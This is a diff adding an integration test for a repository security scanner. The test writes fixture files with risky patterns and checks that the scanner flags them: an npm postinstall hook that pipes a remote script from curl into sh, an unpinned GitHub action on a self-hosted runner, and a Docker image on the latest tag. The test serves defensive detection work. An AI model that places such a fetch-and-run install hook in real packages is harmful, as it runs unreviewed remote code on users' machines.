@@ -2784,6 +2784,74 @@ class ExhaustiveSensitiveFileTests(unittest.TestCase):
         self.assertEqual(self._type_of(".npmrc"), "npmrc")
 
 
+class ExpandedHygieneIntegrationTests(unittest.TestCase):
+    def test_scan_hygiene_includes_local_repository_security_groups(self):
+        with tempfile.TemporaryDirectory(prefix="butian-expanded-hygiene-") as root:
+            os.makedirs(os.path.join(root, ".github", "workflows"))
+            with open(
+                os.path.join(root, "package.json"), "w", encoding="utf-8"
+            ) as handle:
+                json.dump(
+                    {
+                        "scripts": {
+                            "postinstall": "curl https://example.com/install.sh | sh"
+                        }
+                    },
+                    handle,
+                )
+            with open(
+                os.path.join(root, ".github", "workflows", "ci.yml"),
+                "w",
+                encoding="utf-8",
+            ) as handle:
+                handle.write(
+                    "on: [pull_request]\njobs:\n  test:\n    runs-on: [self-hosted, linux]\n    steps:\n      - uses: actions/checkout@v4\n"
+                )
+            with open(
+                os.path.join(root, "Dockerfile"), "w", encoding="utf-8"
+            ) as handle:
+                handle.write("FROM node:latest\nRUN npm ci\n")
+
+            result = scan.scan_hygiene(root)
+
+            self.assertEqual(
+                set(result),
+                {
+                    "gitignore_exists",
+                    "gitignore_missing",
+                    "tracked_secrets",
+                    "sensitive_tracked",
+                    "repository_checks",
+                    "workflow_checks",
+                    "iac_checks",
+                    "coverage",
+                },
+            )
+            self.assertIn("coverage", result)
+            self.assertTrue(
+                any(
+                    item["id"] == "actions.unpinned_action"
+                    for item in result["workflow_checks"]
+                )
+            )
+            self.assertTrue(
+                any(
+                    item["id"] == "supply_chain.suspicious_install_script"
+                    for item in result["repository_checks"]
+                )
+            )
+            self.assertTrue(
+                any(
+                    item["id"] == "iac.docker_latest_tag"
+                    for item in result["iac_checks"]
+                )
+            )
+            self.assertEqual(
+                set(result["coverage"]),
+                {"builtin_rules"},
+            )
+
+
 if __name__ == "__main__":
     unittest.main()
 
